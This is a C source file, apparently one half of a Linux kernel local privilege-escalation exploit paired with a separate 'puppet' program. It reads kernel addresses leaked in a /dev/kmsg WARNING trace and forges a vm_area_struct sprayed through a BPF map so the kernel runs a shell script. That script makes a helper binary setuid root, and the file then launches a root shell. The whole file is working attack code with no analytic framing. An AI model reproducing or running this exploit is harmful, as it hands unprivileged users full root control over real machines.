#define _GNU_SOURCE
#include <err.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <stdbool.h>
#include <sys/eventfd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <linux/bpf.h>

struct list_head {
	struct list_head *next, *prev;
};

struct rb_node {
	unsigned long  __rb_parent_color;
	unsigned long /*struct rb_node **/rb_right;
	unsigned long /*struct rb_node **/rb_left;
} __attribute__((aligned(sizeof(long))));

struct vm_area_struct {
	unsigned long vm_start;
	unsigned long vm_end;
	/*0x10*/
	struct vm_area_struct *vm_next, *vm_prev;
	/*0x20*/
	struct rb_node vm_rb;
	unsigned long rb_subtree_gap;
	unsigned long/*struct mm_struct **/ vm_mm;
	unsigned long vm_page_prot;
	unsigned long vm_flags;

	struct {
		struct rb_node rb;
		unsigned long rb_subtree_last;
	} shared;

	struct list_head anon_vma_chain;
	void/*struct anon_vma*/ *anon_vma;

	unsigned long /*const struct vm_operations_struct **/ vm_ops;

	unsigned long vm_pgoff;
	unsigned long /*struct file **/ vm_file;
	unsigned long /*struct file **/vm_prfile;
	unsigned long /*void **/ vm_private_data;

	unsigned long swap_readahead_info;
	unsigned long /*struct mempolicy **/vm_policy;
	/*struct vm_userfaultfd_ctx vm_userfaultfd_ctx;*/
};

struct vm_operations_struct {
	unsigned long open, close, split, mremap, fault, huge_fault, map_pages,
		      page_mkwrite, pfn_mkwrite, access, name, set_policy,
		      get_policy, find_special_page;
};

int recvfd(int sock) {
	int len = sizeof(struct cmsghdr) + sizeof(int);
	struct cmsghdr *hdr = alloca(len);
	struct msghdr msg = {
		.msg_control = hdr,
		.msg_controllen = len
	};
	if (recvmsg(sock, &msg, 0) < 0) err(1, "recvmsg");
	if (hdr->cmsg_len != len || hdr->cmsg_level != SOL_SOCKET
	    || hdr->cmsg_type != SCM_RIGHTS)
		errx(1, "got bad message");
	return *(int*)CMSG_DATA(hdr);
}

#define VM_WRITE	0x00000002
#define VM_SHARED	0x00000008

int bpf_(int cmd, union bpf_attr *attrs) {
	return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

void sync_add(int fd) {
	unsigned long val = 1;
	write(fd, &val, 8);
}

int main(void) {
	system("date");
	char buf[0x2000];
	int kmsg_fd = open("/dev/kmsg", O_RDONLY|O_NONBLOCK);
	if (kmsg_fd == -1) err(1, "open kmsg");
	while (1) {
		int res = read(kmsg_fd, buf, sizeof(buf));
		if (res == -1 && errno == EAGAIN) break;
	}
	if (fcntl(kmsg_fd, F_SETFL, 0)) err(1, "disable O_NONBLOCK");
	printf("puppeteer: old kmsg consumed\n");

	int control_fd_pair[2];
	int control_event_fd = eventfd(0, EFD_SEMAPHORE);
	if (control_event_fd == -1) err(1, "eventfd");
	if (socketpair(AF_UNIX, SOCK_DGRAM, 0, control_fd_pair))
		err(1, "socketpair");
	pid_t child = fork();
	if (child == -1) err(1, "fork");
	if (child == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		close(kmsg_fd);
		close(control_fd_pair[0]);
		if (dup2(control_fd_pair[1], 0) != 0) err(1, "dup2");
		close(control_fd_pair[1]);
		if (dup2(control_event_fd, 1) != 1) err(1, "dup2");
		execl("./puppet", "puppet", NULL);
		err(1, "execute puppet");
	}
	close(control_fd_pair[1]);

	int bpf_map = recvfd(control_fd_pair[0]);
	printf("got map from child!\n");

	int state = 0;
	unsigned long rsp = 0, vma_kaddr = 0, mm = 0, eventfd_fops = 0;
	while (1) {
		char *ptr;
		int res = read(kmsg_fd, buf, sizeof(buf)-1);
		if (res <= 0) err(1, "unexpected kmsg end");
		buf[res] = '\0';
		if (state == 0 && strstr(buf, "WARNING: ") && strstr(buf, " vmacache_find+")) {
			state = 1;
			printf("got WARNING\n");
		}
		if (state == 1 && (ptr = strstr(buf, "RSP: 0018:"))) {
			rsp = strtoul(ptr+10, NULL, 16);
			printf("got RSP line: 0x%lx\n", rsp);
		}
		if (state == 1 && (ptr = strstr(buf, "RAX: "))) {
			vma_kaddr = strtoul(ptr+5, NULL, 16);
			printf("got RAX line: 0x%lx\n", vma_kaddr);
		}
		if (state == 1 && (ptr = strstr(buf, "RDI: "))) {
			mm = strtoul(ptr+5, NULL, 16);
			printf("got RDI line: 0x%lx\n", mm);
		}
		if (state == 1 && strstr(buf, "RIP: 0010:copy_user_generic_unrolled")) {
			state = 2;
			printf("reached WARNING part 2\n");
		}
		if (state == 2 && (ptr = strstr(buf, "R08: "))) {
			eventfd_fops = strtoul(ptr+5, NULL, 16);
			printf("got R8 line: 0x%lx\n", eventfd_fops);
			state = 3;
		}
		if (state > 0 && strstr(buf, "---[ end trace"))
			break;
	}
	printf("trace consumed\n");

	sleep(1);

	// make suid-maker shell script
	{
		char *suid_path = realpath("./suidhelper", NULL);
		int suid_fd = open("/tmp/%1", O_WRONLY|O_CREAT|O_TRUNC, 0777);
		if (suid_fd == -1) err(1, "make suid shell script");
		char *suid_tmpl = "#!/bin/sh\n"
				  "chown root:root '%s'\n"
				  "chmod 04755 '%s'\n"
				  "while true; do sleep 1337; done\n";
		char suid_text[10000];
		sprintf(suid_text, suid_tmpl, suid_path, suid_path);
		if (write(suid_fd, suid_text, strlen(suid_text)) != strlen(suid_text))
			err(1, "write suid-maker");
		close(suid_fd);
	}

	// prep fake VMA
	long offset = (vma_kaddr - 0x90/*compensate for BPF map header*/) & 0xfff;
	printf("offset: 0x%lx\n", (unsigned long)offset);
	unsigned char fake_vma_page[0x1000];

	// for debugging, if we put the VMA in the wrong place somehow
	for (int i=0; i<0x1000; i+=4) {
		*((unsigned int *)(fake_vma_page+i)) = 0xff000000 | i;
	}

	char kernel_cmd[8] = "/tmp/%1";
	struct vm_area_struct fake_vma = {
		.vm_start = 0x7fffffffd000,
		.vm_end = 0x7fffffffe000,
		.vm_rb = {
			.__rb_parent_color =
			    (eventfd_fops-0xd92ce0), //run_cmd: 0xffffffff810b09a0
			.rb_right = vma_kaddr
			    + offsetof(struct vm_area_struct, vm_rb.rb_left)
			/*rb_left reserved for kernel_cmd*/
		},
		.vm_mm = mm,
		.vm_flags = VM_WRITE|VM_SHARED,
		.vm_ops = vma_kaddr
		    + offsetof(struct vm_area_struct, vm_private_data)
		    - offsetof(struct vm_operations_struct, fault),
		.vm_private_data = eventfd_fops-0xd8da5f,
		.shared = {
			.rb_subtree_last = vma_kaddr
			    + offsetof(struct vm_area_struct, shared.rb.__rb_parent_color)
			    - 0x88,
			.rb = {
				.__rb_parent_color = eventfd_fops-0xd9ebd6
			}
		}
	};
	memcpy(&fake_vma.vm_rb.rb_left, kernel_cmd, sizeof(kernel_cmd));
	if (offset + sizeof(fake_vma) <= 0x1000) {
		memcpy(fake_vma_page + offset, &fake_vma, sizeof(fake_vma));
	} else {
		size_t chunk_len = 0x1000 - offset;
		memcpy(fake_vma_page + offset, &fake_vma, chunk_len);
		memcpy(fake_vma_page, (char*)&fake_vma + chunk_len, sizeof(fake_vma) - chunk_len);
	}


	for (int i=0; i<1024; i++) {
		union bpf_attr update_attr = {
			.map_fd = bpf_map,
			.key = (unsigned long)&i,
			.value = (unsigned long)fake_vma_page,
			.flags = 0
		};
		if (bpf_(BPF_MAP_UPDATE_ELEM, &update_attr))
			err(1, "BPF_MAP_UPDATE_ELEM");
	}
	printf("fake vma pushed\n");
	sync_add(control_event_fd);
	sync_add(control_event_fd);

	while (1) {
		struct stat helperstat;
		if (stat("suidhelper", &helperstat))
			err(1, "stat suidhelper");
		if (helperstat.st_mode & S_ISUID)
			break;
		sleep(1);
	}
	fputs("suid file detected, launching rootshell...\n", stderr);
	execl("./suidhelper", "suidhelper", NULL);
	err(1, "execl suidhelper");
}
